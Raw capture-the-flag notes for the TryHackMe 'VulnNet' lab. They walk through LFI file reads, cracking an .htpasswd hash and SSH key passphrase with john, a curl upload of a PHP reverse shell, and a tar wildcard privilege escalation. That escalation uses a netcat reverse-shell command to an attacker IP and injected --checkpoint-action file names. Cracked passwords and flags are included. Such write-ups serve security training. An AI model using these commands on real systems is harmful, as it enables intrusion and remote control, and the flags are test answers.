#RAW NOTES

# VulnNet

login using get method

when viewing through source code we found a parameter referer which is vulnerable to lfi

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:107:117::/nonexistent:/bin/false
kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
	<script src="/js/index__7ed54732.js"></script>
	<script src="/js/index__d8338055.js"></script>

```

so taking this lfi a bit harder we can view /etc/apache2/sites-enabled/000-default.conf

we can we /etc/apache2/.htpasswd

viewing the file we can see hash of developers

```jsx
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```

cracking with john 

john: wordlist=/usr/share/wordlists/rockyou.txt hash.txt we get

```jsx
9972761drmfsls
```

so we can see the clip smthn cms used of v4 so we can exploit it with metasploit or an exploit available in exploit-db

using this command we can transfer php-shell.php

```jsx
curl -u developers:9972761drmfsls -F "file=@rev.php" -F "plupload=1" -F "name=rev.php" "[http://broadcast.vulnnet.thm/actions/beats_uploader.php](http://broadcast.vulnnet.thm/actions/beats_uploader.php)"
```

curl broadcast.vulnnet.thm/actions/<directory>/filename.php

we can get a shell as www-data

---

found ssh backup file in var/backups

move it in tmp file and run tar

get id_rsa and copy in local machine

then ssh2jon id_rsa > hash

john: wordlist=/usr/share/wordlists/rockyou.txt hash

then we can get the passsphrase

oneTWO3gOyac

user.txt 

THM{907e420d979d8e2992f3d7e16bee1e8b}

---

we can see that the script in /var/opt is backing up everything in ~/Documents folder to /var/backups

so we can see tar "*" vulnerability here

Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) what we can do with `tar` confirms that we can exploit it by creating 2 files which names will be interpreted as options passed to the `tar` command.

```
server-management@vulnnet:/tmp$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.50.72 4444 >/tmp/f" > /home/server-management/Documents/rev.sh
server-management@vulnnet:/tmp$ touch "/home/server-management/Documents/--checkpoint=1"
server-management@vulnnet:/tmp$ touch "/home/server-management/Documents/--checkpoint-action=exec=sh rev.sh"
```

THM{220b671dd8adc301b34c2738ee8295ba}
